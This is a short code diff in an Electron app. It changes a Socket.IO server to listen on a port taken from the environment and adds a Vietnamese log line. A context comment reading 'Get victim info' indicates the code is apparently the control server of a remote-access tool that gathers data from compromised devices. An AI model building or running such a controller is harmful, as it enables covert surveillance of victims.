@@ -127,9 +127,12 @@ app.on('activate', () => {
 
 // fired when start listening
 // It will be fired when AppCtrl emit this event
-ipcMain.on('SocketIO:Listen', function (event, port) {
 
-  IO = io.listen(port);
+ipcMain.on('SocketIO:Listen', function (event, port) {
+  const PORT = process.env.PORT || 8080;
+  IO = io.listen(PORT);
+  console.log("Server chạy cổng:", PORT);
+
   IO.sockets.pingInterval = 10000;
   IO.sockets.on('connection', function (socket) {
     // Get victim info
